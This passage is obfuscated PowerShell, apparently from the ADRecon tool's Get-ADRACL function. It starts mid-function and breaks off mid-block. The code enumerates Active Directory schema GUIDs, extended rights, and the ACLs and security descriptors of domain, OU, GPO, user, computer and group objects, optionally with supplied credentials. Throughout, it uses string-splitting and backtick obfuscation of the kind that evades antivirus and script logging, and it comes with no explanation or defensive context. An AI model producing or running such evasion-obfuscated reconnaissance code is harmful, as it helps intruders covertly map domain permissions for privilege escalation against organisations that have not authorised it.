                                If (${C`Re`d`eNtIAl} -ne   (gI ('vaRIA'+'ble:'+'CL'+'F0'+'n') ).value::"EM`pTY")
                                {
                                    ${A`DoB`je`cT} = &("{2}{0}{3}{1}"-f 'bj','ct','New-O','e') ("{1}{8}{2}{4}{7}{3}{5}{0}{9}{6}" -f'ecto','System.D','recto','rvices.Di','r','r','ntry','ySe','i','ryE')("LDAP://$DomainFQDN/<SID=$TargetSid>",(${creDent`I`AL}.("{2}{0}{3}{4}{1}{5}{6}"-f 't','r','Ge','Net','wo','kCrede','ntial').Invoke())."usErNa`ME",(${cReD`ENTI`AL}.("{1}{0}{3}{4}{2}" -f 'tNe','Ge','l','tw','orkCredentia').Invoke())."Pa`SS`woRd")
                                }
                                Else
                                {
                                    ${ADo`Bj`EcT} = &("{1}{2}{0}" -f'ct','New-Ob','je') ("{4}{0}{8}{5}{3}{1}{11}{2}{7}{6}{9}{10}"-f'm.','tor','ices.','c','Syste','e','i','D','Dir','re','ctoryEntry','yServ')("LDAP://$DomainFQDN/<SID=$TargetSid>")
                                }
                                If (${aDoB`j`eCT})
                                {
                                    If (-Not (  (  GcI vaRIABlE:b2o ).ValuE::("{1}{2}{0}" -f'pty','IsNullOrE','m').Invoke(${AD`O`BJ`ect}."pROp`e`RTI`Es"."S`AMACc`OuntN`A`Me")) )
                                    {
                                        ${uSE`RD`oMa`IN} = &("{2}{1}{0}" -f'N','toFQD','Get-DN') -ADObjectDN $([string] (${A`do`BJecT}."prOP`E`RTI`eS"."dIStI`NgUisHeD`Na`mE"))
                                        ${aDs`ou`TP`Ut} = ${U`sERd`oM`AiN} + "\" + $([string] (${A`dOb`JEcT}."PrOP`E`RTiEs"."SAMaCcOuN`TN`Ame"))
                                        &("{1}{3}{4}{2}{0}" -f 'iable','Rem','ar','ove','-V') ("{2}{0}{1}"-f'serDoma','in','U')
                                    }
                                }
                            }

                            If ( (-Not ${A`dso`UtpUt}) -or ( $B2o::("{2}{0}{3}{1}"-f 'sNu','ty','I','llOrEmp').Invoke(${AdSo`UTp`UT})) )
                            {
                                ${a`Dsou`TpU`TTyPe} = ${ADs_NAm`e_ty`PE_`Nt4}
                                ${in`It} = ${tr`UE}
                                ${TRan`sL`Ate} = &("{0}{2}{1}" -f 'N','bject','ew-O') -ComObject ("{2}{0}{3}{1}" -f 'meT','ate','Na','ransl')
                                If (${CrEd`En`Ti`AL} -ne  $ClF0n::"e`MPtY")
                                {
                                    ${aDSiN`itty`PE} = ${adS_NAm`E_inI`T`TypE_DOm`A`IN}
                                    Try
                                    {
                                         (  VarIaBLe  ("O0"+"uY")  -vAlu  ).("{0}{2}{3}{1}" -f 'I','Member','n','voke').Invoke(("{0}{1}"-f 'In','itEx'),("{0}{1}{2}" -f 'I','nvo','keMethod'),${N`Ull},${tR`AnSl`ATe},$(@(${ADSi`NiTt`y`pe},${Do`mA`InF`QDN},(${CrED`ENT`I`Al}.("{2}{3}{0}{5}{4}{1}" -f'ork','ntial','Ge','tNetw','e','Cred').Invoke())."USER`N`AME",${DOMa`INFQ`Dn},(${c`R`ede`NtiaL}.("{3}{0}{4}{1}{2}" -f't','workCredentia','l','Ge','Net').Invoke())."pA`SSw`ORd")))
                                    }
                                    Catch
                                    {
                                        ${I`NiT} = ${F`Al`se}
                                        
                                        
                                    }
                                }
                                Else
                                {
                                    ${a`DsiNIt`Type} = ${a`d`s_na`me`_iNiTTY`P`e_gC}
                                    Try
                                    {
                                         (ChIldITeM vARiABlE:O0uy).VALUe.("{3}{2}{0}{1}"-f 'ke','Member','o','Inv').Invoke(("{1}{0}" -f't','Ini'),("{1}{0}{2}" -f 'et','InvokeM','hod'),${n`ULl},${trA`Nsl`A`Te},(${aD`si`NITTy`pE},${NU`Ll}))
                                    }
                                    Catch
                                    {
                                        ${iN`it} = ${f`A`LSe}
                                        
                                        
                                    }
                                }
                                If (${I`NiT})
                                {
                                      (gEt-VariABLe  ("o0U"+"y")).Value.("{1}{2}{0}" -f'mber','Invoke','Me').Invoke(("{2}{0}{4}{1}{3}"-f 'R','r','Chase','ral','efe'),("{1}{2}{0}" -f'ty','Set','Proper'),${n`ULl},${t`RAnSl`ATe},${a`dS`_`chasE_`REFErRa`LS_aLwAYS})
                                    Try
                                    {
                                         (  VArIable  o0uy  ).valUe.("{1}{0}{2}" -f'vokeMembe','In','r').Invoke("Set",("{0}{1}{2}" -f'Invok','e','Method'),${Nu`lL},${tRa`N`SlA`TE},(${ads_n`AM`E_TYpe_U`NKn`owN}, ${TA`RGEt`sId}))
                                        ${Ad`SoU`TPut} =   (  VAriabLE  O0uy -VALUEoNly ).("{2}{0}{1}"-f 'eMembe','r','Invok').Invoke("Get",("{0}{1}{2}" -f 'I','nvokeMe','thod'),${n`ULl},${t`RAn`sLate},${A`DSoutP`UtTYPE})
                                    }
                                    Catch
                                    {
                                        
                                        
                                    }
                                }
                            }
                        }
                        If (-Not (  (Variable ("B2"+"o") -VALU  )::("{2}{3}{0}{1}" -f'mpt','y','IsNullOr','E').Invoke(${A`dSOutp`Ut})) )
                        {
                            Return ${ADS`out`p`UT}
                        }
                        Else
                        {
                            Return ${t`ARgE`TsiD}
                        }
                    }
                }
            }
            Catch
            {
                
                
            }
        }
        Else
        {
            Return ${TArG`ET`Sid}
        }
    }
}


Function GE`T`-adR`AcL
{

    param(
        [Parameter(mAndAtOrY = ${Tr`Ue})]
        [string] ${ME`ThOD},

        [Parameter(mANDaTOrY = ${fA`lse})]
        [DirectoryServices.DirectoryEntry] ${O`BJDo`M`AIN},

        [Parameter(mAnDAtoRY = ${FA`l`sE})]
        [string] ${domAinC`oN`TroLl`ER},

        [Parameter(mandatOrY = ${F`ALse})]
        [Management.Automation.PSCredential] ${c`REd`enTIaL} =   (  gI  variable:CLf0n  ).vALuE::"E`mpTy",

        [Parameter(mAnDAtOrY = ${F`ALSE})]
        [bool] ${r`ESO`L`VesID} = ${fAl`Se},

        [Parameter(MaNDaTorY = ${t`RUe})]
        [int] ${pa`GE`S`iZE} = 200,

        [Parameter(mANdatorY = ${fa`Lse})]
        [int] ${ThR`e`ADS} = 10,

        [Parameter(MAndATory = ${fA`LSe})]
        [string] ${dN`Ba`Se} = $(${a`D`doMAIn}."D`istI`N`guIShE`d`NaME")
    )

    If (${m`E`THoD} -eq ("{0}{1}"-f'ADW','S'))
    {
        If (${c`REdENT`IaL} -eq   ( get-vARiABle ("c"+"Lf0n")  -va  )::"em`PtY")
        {
            If (&("{1}{0}{2}"-f 'est-Pa','T','th') ("{1}{0}"-f 'D:','A'))
            {
                &("{2}{0}{1}" -f 'et-','Location','S') ("{1}{0}" -f'D:','A')
            }
            Else
            {
                &("{1}{0}{3}{2}"-f 'te-','Wri','arning','W') ("{15}{7}{9}{1}{10}{3}{12}{6}{13}{11}{0}{5}{2}{4}{8}{14}"-f'CL e','drive','u','... Sk','me','n','p','l','ratio','t AD ',' not found ','g A','ip','in','n','Defau')
                Return ${N`ULl}
            }
        }
        ${g`UiDs} = @{("{0}{4}{1}{5}{2}{6}{3}" -f'0','000000-0000-0','00-','00000000','0','0','0000-0000') = 'All'}
        Try
        {
            &("{0}{2}{1}"-f 'W','ose','rite-Verb') ("{0}{5}{6}{2}{3}{1}{4}"-f '[*','aI','e','rating schem','Ds','] En','um')
            ${sc`HE`MAiDS} = &("{2}{0}{3}{1}" -f'ADO','t','Get-','bjec') -SearchBase (&("{3}{2}{4}{1}{0}"-f'E','DS','t-ADR','Ge','oot'))."SchEmANamINGc`oN`TE`xt" -LDAPFilter (("{5}{1}{3}{2}{4}{0}" -f'UID=*)','ma','D','I','G','(sche')) -Properties ("{0}{1}" -f'nam','e'), ("{1}{0}{2}{3}" -f'chema','s','ID','GUID')
        }
        Catch
        {
            &("{2}{0}{3}{1}" -f 'te-War','g','Wri','nin') ("{11}{6}{8}{9}{1}{5}{2}{7}{3}{4}{10}{0}" -f'IDs','le','erating','sc','he',' enum','et-A',' ','DR','ACL] Error whi','ma','[G')
            &("{2}{0}{1}{3}" -f 'te-','Verb','Wri','ose') "[EXCEPTION] $($_.Exception.Message) "
        }

        If (${sCHe`mA`IDS})
        {
            ${scHEMA`I`dS} | &("{2}{1}{0}{3}"-f 'e-Objec','r','Whe','t') {${_}} | &("{2}{1}{0}{3}" -f 'Obje','orEach-','F','ct') {
                
                ${Gu`I`DS}[(&("{0}{2}{1}"-f'Ne','ct','w-Obje') ("{0}{1}"-f 'G','uid') (,${_}."S`CHE`mAidGuid"))."g`Uid"] = ${_}."n`AME"
            }
            &("{2}{1}{4}{3}{0}"-f 'able','ove','Rem','Vari','-') ("{2}{1}{0}" -f 'IDs','a','schem')
        }

        Try
        {
            &("{2}{0}{1}" -f 'e-','Verbose','Writ') ("{2}{3}{5}{0}{4}{6}{7}{1}" -f ' Activ','ts','[*','] Enumerat','e Dir','ing','ec','tory Righ')
            ${scH`eMa`iDS} = &("{0}{1}{2}"-f'Get-AD','O','bject') -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter (("{4}{1}{3}{0}{5}{2}"-f 's=contr','tC','AccessRight)','las','(objec','ol')) -Properties ("{1}{0}"-f 'me','na'), ("{3}{2}{0}{1}" -f'UI','D','ghtsG','ri')
        }
        Catch
        {
            &("{2}{3}{1}{0}"-f 'g','-Warnin','Writ','e') ("{13}{16}{12}{8}{10}{6}{11}{15}{14}{5}{4}{1}{2}{7}{0}{9}{3}" -f 'ory','v','e ','hts','i','t','hile','Direct','Error',' Rig',' w',' ','t-ADRACL] ','[','ting Ac','enumera','Ge')
            &("{3}{0}{1}{2}" -f'te','-','Verbose','Wri') "[EXCEPTION] $($_.Exception.Message) "
        }

        If (${SCHe`ma`IDs})
        {
            ${scH`EM`A`ids} | &("{2}{1}{0}{3}" -f 're-Obj','e','Wh','ect') {${_}} | &("{0}{2}{1}{3}"-f 'ForEach-Ob','c','je','t') {
                
                ${gU`IDS}[(&("{2}{0}{1}" -f 'bj','ect','New-O') ("{1}{0}" -f'd','Gui') (,${_}."RIG`hT`SgUiD"))."gU`iD"] = ${_}."nA`Me"
            }
            &("{2}{0}{1}{3}" -f 'Va','ri','Remove-','able') ("{1}{3}{2}{0}"-f'Ds','s','maI','che')
        }

        
        ${oB`js} = @()
        Try
        {
            ${aD`do`MaIn} = &("{2}{0}{3}{1}" -f'et-AD','ain','G','Dom')
        }
        Catch
        {
            &("{1}{2}{0}"-f'ng','Wr','ite-Warni') ("{6}{0}{12}{5}{1}{7}{8}{2}{3}{10}{9}{11}{4}"-f'e','RACL]','r ge','tting Doma','xt','-AD','[G',' ','Erro','Cont','in ','e','t')
            &("{1}{2}{0}"-f'-Verbose','Wr','ite') "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            &("{1}{4}{0}{3}{2}"-f '-Ver','Wri','ose','b','te') ("{5}{10}{8}{0}{7}{3}{6}{2}{1}{4}{9}"-f 'erating ','mputer and Grou','Co','mai','p','[*','n, OU, GPO, User, ','Do','Enum',' Objects','] ')
            ${o`Bjs} += &("{0}{2}{1}" -f 'Ge','DObject','t-A') -SearchBase ${DNBa`Se} -LDAPFilter ((("{58}{50}{23}{53}{21}{64}{72}{13}{44}{48}{22}{32}{6}{37}{33}{46}{69}{3}{35}{5}{51}{42}{43}{66}{62}{47}{15}{18}{34}{49}{11}{52}{1}{7}{29}{70}{74}{63}{30}{27}{38}{71}{56}{24}{14}{61}{59}{4}{57}{54}{25}{67}{55}{16}{36}{12}{73}{31}{9}{0}{39}{45}{20}{26}{40}{68}{2}{60}{19}{8}{10}{17}{65}{28}{41}" -f 'ac','Ty','(','z','26','n','C','pe=8','maccou','m','n','Acc','pe=26843','in','untt','pPo','cc','tty','li','a','ty','Clas','e','e','cco','6)','p','t','=5','05306368)','oun','7)(sa','ct','ry=orga','cyC','ationalu','ountty','atego','Ty','co','e=53','36870913))','t)(objectCate','go',')','unt','n','u','(obj','ontainer)(sam','j','i','ount','ct','3545','sama','6369)(sama','84','(Eol(ob','e=','s','yp','ro','Acc','s=dom','pe','ry=g','(','6870912)','i','(sa','pe=80530','a','545','m'))."R`E`plACe"(([ChaR]69+[ChaR]111+[ChaR]108),[strinG][ChaR]124)) -Properties ("{1}{3}{0}{2}" -f 'y','D','Name','ispla'), ("{0}{5}{1}{3}{4}{2}"-f'Di','tinguishe','ame','d','N','s'), ("{0}{1}" -f 'Na','me'), ("{0}{3}{4}{2}{1}" -f 'ntsec','r','o','urit','ydescript'), ("{2}{0}{1}" -f 'ctCl','ass','Obje'), ("{1}{0}" -f'ectsid','obj')
        }
        Catch
        {
            &("{1}{2}{0}"-f 'Warning','Writ','e-') ("{8}{17}{14}{2}{0}{13}{16}{12}{10}{3}{6}{4}{11}{1}{15}{9}{7}{5}"-f'ile enu',', Co','] Error wh',' OU, G',' U','oup Objects','PO,',' and Gr','[','puter','g Domain,','ser','n','merat','DRACL','m','i','Get-A')
            &("{3}{2}{1}{0}" -f'bose','e-Ver','it','Wr') "[EXCEPTION] $($_.Exception.Message) "
        }

        If (${a`D`domA`iN})
        {
            Try
            {
                &("{2}{0}{1}" -f'erbos','e','Write-V') ("{2}{7}{6}{9}{0}{8}{3}{4}{1}{5}{10}"-f 'ting Ro','t','[*]','t ','Con','ai','m',' Enu','o','era','ner Objects')
                ${o`BJs} += &("{2}{3}{1}{0}" -f 'ct','DObje','Ge','t-A') -SearchBase $(${aDd`Om`A`In}."DiStINg`U`ishe`dNa`Me") -SearchScope ("{0}{1}{2}"-f 'On','eLeve','l') -LDAPFilter ("{2}{1}{4}{5}{3}{0}{6}"-f'e','o','(','n','b','jectClass=contai','r)') -Properties ("{1}{0}{2}{3}" -f'st','Di','inguishedN','ame'), ("{0}{1}" -f'N','ame'), ("{5}{3}{0}{4}{2}{1}" -f 'curit','iptor','scr','se','yde','nt'), ("{1}{2}{0}"-f 'ass','Obj','ectCl')
            }
            Catch
            {
                &("{0}{4}{2}{3}{1}"-f'W','arning','te-','W','ri') ("{8}{13}{2}{6}{12}{1}{7}{9}{4}{3}{0}{14}{11}{5}{10}"-f'ing','i','L','at','umer','nt','] Error w','le','[Get-A',' en','ainer Objects',' Co','h','DRAC',' Root')
                &("{2}{1}{0}" -f'ose','-Verb','Write') "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If (${ob`jS})
        {
            ${a`c`Lobj} = @()
            &("{1}{0}{2}"-f'rite-','W','Verbose') "[*] Total Objects: $([ADRecon.ADWSClass]::ObjectCount($Objs)) "
            &("{2}{1}{0}"-f'se','te-Verbo','Wri') ("{1}{3}{0}{2}"-f'] D','[','ACLs','-')
            ${d`Ac`lOBj} =  (dIR  VAriAble:9B5p6  ).vaLue::("{0}{1}{2}"-f 'D','ACLP','arser').Invoke(${Ob`jS}, ${g`U`IdS}, ${TH`REA`DS})
            
            &("{3}{2}{0}{4}{1}" -f'ite-War','g','r','W','nin') ("{0}{10}{4}{12}{6}{11}{8}{7}{13}{5}{1}{3}{2}{9}" -f'[*]','s only s','t','uppor','C','i','ly','e','modul','ed with LDAP.',' SACLs - ',', the ','urrent',' ')
            
            &("{1}{3}{0}{2}" -f'e-Varia','R','ble','emov') ("{0}{1}"-f'O','bjs')
            &("{0}{4}{3}{1}{2}"-f 'Re','riab','le','Va','move-') ("{1}{0}"-f 'Ds','GUI')
        }
    }

    If (${meT`HOd} -eq ("{0}{1}"-f 'LDA','P'))
    {
        ${G`UidS} = @{("{7}{3}{4}{2}{0}{6}{1}{5}{8}" -f '0','0000','0000-','0000-00','00-0000-','0000','0','0000','00') = 'All'}

        If (${cR`ed`ENtIaL} -ne   (VaRiablE  CLF0n -VaLue)::"emP`TY")
        {
            ${doMAi`N`FQ`Dn} = &("{0}{3}{1}{2}"-f 'G','t-DN','toFQDN','e')(${OB`JDOmA`in}."DIsT`In`GuIS`He`D`NAMe")
            ${DO`Ma`iNcONTe`XT} = &("{2}{1}{0}" -f'Object','-','New') ("{2}{5}{7}{0}{3}{10}{8}{1}{4}{9}{11}{6}" -f'ctoryServic','veDirectory.D','Sy','es.','irec','ste','t','m.Dire','ti','toryConte','Ac','x')(("{0}{1}" -f'Dom','ain'),$(${DomAi`NF`q`dN}),$(${Cr`ed`eNT`iaL}."us`ern`Ame"),$(${crEDe`NTI`Al}.("{2}{3}{0}{5}{4}{1}{6}" -f't','edent','G','etNe','orkCr','w','ial').Invoke()."pa`sswo`Rd"))
            Try
            {
                ${A`dDoMain} =  ( itEM VaRiABLe:uX5m ).vALue::("{1}{3}{2}{0}" -f 'in','Ge','ma','tDo').Invoke(${DO`maiNCO`N`TexT})
            }
            Catch
            {
                &("{1}{2}{0}{3}"-f'Warni','Write','-','ng') ("{1}{4}{6}{7}{2}{5}{0}{3}" -f'ntex','[G','ng D','t','et-','omain Co','ADRACL] Er','ror getti')
                &("{2}{0}{1}{3}"-f'ite-V','erbo','Wr','se') "[EXCEPTION] $($_.Exception.Message) "
            }

            Try
            {
                ${FO`RE`stc`OntexT} = &("{2}{0}{1}" -f'Objec','t','New-') ("{7}{13}{4}{11}{1}{0}{12}{2}{9}{3}{8}{6}{5}{10}" -f'i','Serv','s.Act','e','em','onte','toryC','Sy','ctory.Direc','iveDir','xt','.Directory','ce','st')(("{1}{0}"-f'rest','Fo'),$(${a`Dd`OMaiN}."fo`ResT"),$(${c`REde`NTIal}."US`E`RnamE"),$(${crEdeN`Ti`Al}.("{2}{3}{0}{4}{1}"-f'tNetworkCr','al','G','e','edenti').Invoke()."PasSwo`Rd"))
                ${adf`O`Rest} =  (CHIlditEM  ('vArIAbL'+'e:W'+'vLf') ).VAlUe::("{2}{0}{1}" -f'e','tForest','G').Invoke(${for`esT`CONT`eXt})
                ${s`Che`mAPATh} = ${aD`FoRe`ST}."S`cHemA"."N`AME"
                &("{0}{2}{4}{1}{3}"-f 'Rem','Varia','ove','ble','-') ("{1}{0}{2}" -f'DFo','A','rest')
            }
            Catch
            {
                &("{0}{3}{1}{2}" -f 'W','n','g','rite-Warni') ("{8}{6}{10}{7}{5}{9}{2}{3}{4}{1}{0}"-f'th','Pa','e','m','a',' S','CL] E','ating','[Get-ADRA','ch','rror enumer')
                &("{3}{1}{0}{2}" -f'Ve','ite-','rbose','Wr') "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            ${aDdOMA`iN} =  (  vaRiaBlE uX5M  -ValuEOnL)::("{2}{1}{4}{3}{0}"-f 'main','etCurrent','G','o','D').Invoke()
            ${A`dFO`Rest} =  ( gEt-VaRIABLE WvLf ).VaLue::("{0}{1}{2}{3}{4}" -f'GetCurre','n','t','F','orest').Invoke()
            ${s`Ch`EmApAth} = ${A`D`FOResT}."s`ChemA"."N`AmE"
            &("{0}{1}{2}"-f 'Remov','e','-Variable') ("{1}{2}{0}" -f'est','A','DFor')
        }

        If (${sc`hE`mA`pATH})
        {
            &("{2}{0}{1}{3}"-f 'er','bos','Write-V','e') ("{4}{3}{5}{2}{6}{0}{1}"-f'sch','emaIDs','ing','ume','[*] En','rat',' ')
            If (${CR`eDe`NTIAL} -ne   (gET-ChILdItem ("V"+"ArIABLE"+":c"+"LF0n")  ).vAlUe::"EM`pTY")
            {
                ${OBjse`ARC`hP`A`TH} = &("{2}{1}{0}" -f 't','ew-Objec','N') ("{4}{3}{2}{5}{1}{6}{10}{7}{9}{8}{0}" -f 'try','r','t','stem.Direc','Sy','orySe','vices','o','n','ryE','.Direct') "LDAP://$($DomainController)/$($SchemaPath)", ${crEDEn`T`ial}."usE`RN`AME",${CreDEN`T`IAL}.("{0}{2}{3}{1}{4}{5}" -f'GetNetwor','nti','kC','rede','a','l').Invoke()."pa`SSW`oRD"
                ${O`BjseAr`Che`RPa`Th} = &("{2}{1}{0}" -f'bject','w-O','Ne') ("{0}{8}{5}{7}{1}{4}{6}{11}{9}{2}{10}{3}" -f'Syst','.','Search','r','Dir','ectoryServ','e','ices','em.Dir','ry','e','cto') ${OB`JS`eARCH`PaTh}
            }
            Else
            {
                ${obJS`eArcHE`Rp`ATh} = &("{1}{0}{2}"-f'ew-Ob','N','ject') ("{7}{6}{1}{5}{3}{0}{2}{4}"-f'.D','te','irectorySear','.DirectoryServices','cher','m','s','Sy') ([ADSI] "LDAP://$($SchemaPath)")
            }
            ${OBj`SE`ArCheRP`A`TH}."pAgeS`I`zE" = ${Pa`gEsI`ze}
            ${OBjSEAR`Che`R`p`ATh}."FILt`eR" = (("{3}{2}{0}{1}"-f'aIDGU','ID=*)','hem','(sc'))

            Try
            {
                ${sC`hEmasEA`RC`hER} = ${OB`JSEa`RC`hErPaTh}.("{1}{2}{0}" -f 'll','Fi','ndA').Invoke()
            }
            Catch
            {
                &("{0}{2}{3}{4}{1}"-f'W','ng','ri','te-War','ni') ("{5}{6}{3}{2}{7}{0}{1}{4}"-f'rro','r enumer',' ','ADRACL]','ating SchemaIDs','[Get','-','E')
                &("{3}{1}{0}{2}"-f '-Ver','ite','bose','Wr') "[EXCEPTION] $($_.Exception.Message) "
            }

            If (${s`CH`eMas`EArCh`eR})
            {
                ${Sche`mA`S`E`ArcHeR} | &("{0}{1}{2}"-f'Where-O','b','ject') {${_}} | &("{1}{3}{2}{4}{0}"-f'ect','Fo','Each-O','r','bj') {
                    
                    ${gu`i`dS}[(&("{2}{1}{0}{3}"-f 'je','w-Ob','Ne','ct') ("{1}{0}"-f 'd','Gui') (,${_}."p`RO`peRT`Ies"."ScHEm`AId`gU`Id"[0]))."GU`Id"] = ${_}."pr`OP`ERtieS"."NA`me"[0]
                }
                ${s`cHemA`SeA`RChER}.("{1}{0}" -f 'ispose','d').Invoke()
            }
            ${Ob`jS`ear`ChErPa`TH}.("{1}{0}{2}" -f 'spos','di','e').Invoke()

            &("{3}{4}{2}{0}{1}" -f'-Verb','ose','te','Wr','i') ("{0}{6}{7}{2}{5}{3}{4}{1}"-f'[*]','ts','Acti','Ri','gh','ve Directory ',' Enume','rating ')
            If (${CReD`E`NtI`Al} -ne  $ClF0N::"e`MpTY")
            {
                ${oBJsE`ARCHp`AtH} = &("{1}{2}{0}"-f 't','New','-Objec') ("{3}{5}{2}{10}{6}{9}{11}{0}{1}{7}{4}{8}" -f'ce','s.D','ecto','System.','yE','Dir','ySe','irector','ntry','r','r','vi') (("LDAP://$($DomainController)/$($SchemaPath.replace("Schema","Extended-Rights"))")), ${cR`E`d`eNtIAL}."usern`AmE",${C`REd`ENT`ial}.("{2}{3}{4}{1}{0}" -f 'ntial','de','Get','N','etworkCre').Invoke()."p`ASswO`RD"
                ${oBJS`eaRCH`E`RpATh} = &("{1}{2}{3}{0}"-f 'ject','N','e','w-Ob') ("{4}{8}{6}{5}{0}{3}{2}{7}{1}" -f 'vices.','her','ctory','Dire','System','er','toryS','Searc','.Direc') ${Ob`js`EA`R`cHpaTH}
            }
            Else
            {
                ${O`BJsE`A`RcHerPATh} = &("{1}{0}{2}" -f '-O','New','bject') ("{3}{6}{2}{1}{7}{5}{0}{8}{4}" -f 'arc','irectorySer','m.D','S','er','.DirectorySe','yste','vices','h') ([ADSI] (("LDAP://$($SchemaPath.replace("Schema","Extended-Rights"))")))
            }
            ${oBj`seARcherPA`TH}."p`AGe`siZE" = ${p`A`gEsizE}
            ${oBJ`SEA`R`CHeRpAth}."F`ilTer" = (("{3}{2}{7}{0}{5}{4}{8}{6}{1}"-f 'lass=co',')','e','(obj','R','ntrolAccess','t','ctC','igh'))

            Try
            {
                ${r`IghT`sSEA`Rch`er} = ${O`BJ`SEa`RC`hErpaTH}.("{0}{2}{1}" -f 'Fi','l','ndAl').Invoke()
            }
            Catch
            {
                &("{2}{1}{3}{0}"-f'e-Warning','ri','W','t') ("{0}{7}{5}{9}{1}{2}{6}{8}{3}{4}" -f '[Get-AD','erat','ing','e ','Directory Rights','ror enu',' A','RACL] Er','ctiv','m')
                &("{2}{1}{0}"-f'erbose','-V','Write') "[EXCEPTION] $($_.Exception.Message) "
            }

            If (${rigHT`SsEArC`hER})
            {
                ${rIghtSs`E`ArCHER} | &("{3}{2}{0}{1}" -f 'j','ect','here-Ob','W') {${_}} | &("{1}{3}{4}{2}{0}"-f't','F','jec','orEac','h-Ob') {
                    
                    ${gUi`ds}[${_}."P`RO`PerTiEs"."R`Ig`htsGU`Id"[0].("{2}{1}{0}" -f'g','rin','toSt').Invoke()] = ${_}."P`ROPER`T`iES"."n`AME"[0]
                }
                ${RIgh`T`Sse`ARcHER}.("{0}{1}{2}"-f 'd','ispos','e').Invoke()
            }
            ${o`BJs`e`ArchErpath}.("{1}{0}" -f 'pose','dis').Invoke()
        }

        
        ${OB`jS} = @()
        &("{2}{3}{0}{1}" -f 'rbo','se','Write','-Ve') ("{8}{12}{10}{13}{5}{7}{1}{11}{14}{4}{2}{3}{16}{0}{15}{6}{17}{9}" -f' ',',','o','mput',' C','in, ','Group','OU','[*] Enumerati','ects',' ',' GPO, Us','ng','Doma','er,','and ','er',' Obj')
        ${O`BjsE`ARCher} = &("{1}{2}{0}"-f 'ject','New','-Ob') ("{1}{10}{7}{3}{2}{4}{5}{0}{9}{8}{6}"-f 'cto','S','rect','i','o','ryServices.Dire','r','.D','rche','rySea','ystem') ${oBjDo`M`Ain}
        ${O`B`jSeaRC`HER}."Pa`GE`Size" = ${p`AGe`sIze}
        ${OBJ`sEARCHe`R`pA`TH}."Se`Ar`chrOoT" = "LDAP://$DnBase"
        ${Ob`j`sEArC`HEr}."fil`TEr" = ((("{23}{6}{24}{45}{14}{36}{22}{31}{3}{39}{21}{49}{41}{37}{13}{1}{43}{34}{10}{48}{16}{27}{30}{46}{18}{28}{7}{8}{44}{29}{32}{26}{42}{4}{47}{20}{5}{38}{33}{11}{9}{0}{17}{25}{12}{35}{2}{19}{15}{40}" -f '(samac','r)',')(samac','=','ama','p','(obje','06369)(sam','account','435457)','ntTy','8','=53','taine','ctCa','53','306368)(s','countt','05','counttype=','ountty','ani','gor','(mY1','ctClas','ype','3545','amAcc','3','e=26','o','y','84','6','amAccou','6870912','te','n','e=2','org','6870913))','ectCategory=groupPolicyCo','6)(s','(s','typ','s=domain)(obje','untType=8','cc','pe=805','zationalunit)(obj'))."R`ePLaCE"(([CHaR]109+[CHaR]89+[CHaR]49),'|'))
        
        ${oBjSea`R`C`HER}."seCuRiT`YM`ASKS" =   $qrYUK::"d`ACL" -bor   (gI ('VariA'+'BLE:'+'qRYu'+'k') ).VAlUE::"Gro`UP" -bor  (Item VariaBLE:QRYuK  ).value::"Own`Er" -bor   (ItEm ("va"+"riA"+"bLe:Q"+"RyUK")).vaLue::"s`Acl"
        ${oBjse`Arc`hEr}."pRoPerTIE`S`ToloAd".("{1}{2}{0}" -f 'nge','Add','Ra').Invoke((("{2}{0}{1}" -f'yna','me','displa'),("{2}{1}{3}{0}" -f'ame','tinguis','dis','hedn'),("{1}{0}"-f 'ame','n'),("{3}{0}{1}{4}{2}"-f'i','ty','scriptor','ntsecur','de'),("{2}{1}{3}{0}" -f'ass','e','obj','ctcl'),("{1}{2}{0}"-f'sid','objec','t')))
        ${ObJSeaR`cH`er}."s`ea`RcH`scOpE" = ("{0}{1}" -f'Subtre','e')

        Try
        {
            ${OB`JS} += ${oBjsearC`H`Er}.("{0}{1}"-f'Fin','dAll').Invoke()
        }
        Catch
        {
            &("{0}{1}{2}" -f'W','rite-Warnin','g') ("{20}{10}{15}{19}{18}{1}{14}{17}{4}{7}{6}{2}{16}{22}{21}{0}{3}{12}{11}{9}{13}{8}{5}" -f 'ompu','hile enumerat',' ','t','Dom','ects','n,','ai','bj','ro','et-AD',' G','er and','up O','in','R','O','g ',' Error w','ACL]','[G',', User, C','U, GPO')
            &("{3}{1}{0}{2}"-f 'b','ite-Ver','ose','Wr') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${ObJsEarc`H`ER}.("{1}{2}{0}"-f'se','disp','o').Invoke()

        &("{1}{0}{2}{3}"-f'te-Ver','Wri','bo','se') ("{4}{2}{3}{6}{5}{0}{1}"-f 'ainer',' Objects','mer','ating Ro','[*] Enu',' Cont','ot')
        ${oB`jse`ArCH`ER} = &("{1}{0}{2}" -f'e','N','w-Object') ("{7}{6}{1}{5}{11}{4}{9}{3}{8}{0}{2}{10}"-f'tory','tem.Dir','Sear','D','es','ectorySer','s','Sy','irec','.','cher','vic') ${oB`jDOm`AiN}
        ${O`Bjsea`RcHer}."PAGesi`Ze" = ${pA`gES`ize}
        ${OBJ`sE`A`RCHER}."fIl`T`ER" = ("{0}{2}{1}{3}{5}{4}" -f '(','ctClas','obje','s=c',')','ontainer')
        
        ${oB`JSEarc`H`ER}."se`cU`RiTYmasKS" = ${OBjs`eA`R`cHeR}."s`EC`UriTYm`As`ks" =  $QRYuk::"d`ACl" -bor   $qRyUK::"gr`Oup" -bor  (  Get-VARIaBlE QrYUk  ).vAlue::"O`WnER" -bor   (GCi  vARiaBlE:QrYUK ).value::"sA`Cl"
        ${obJSEA`R`ch`ER}."pROPe`R`TIes`TOl`oaD".("{2}{0}{1}" -f'dRan','ge','Ad').Invoke((("{1}{2}{3}{0}"-f 'shedname','di','st','ingui'),("{1}{0}"-f 'e','nam'),("{1}{0}{2}{3}{4}"-f'u','ntsec','rityd','escrip','tor'),("{2}{1}{0}"-f 'ctclass','je','ob')))
        ${oBjSE`A`RCh`eR}."S`earCHS`Co`pE" = ("{2}{1}{0}"-f'el','eLev','On')

        Try
        {
            ${Ob`jS} += ${OB`jsEAR`cHer}.("{1}{0}"-f 'dAll','Fin').Invoke()
        }
        Catch
        {
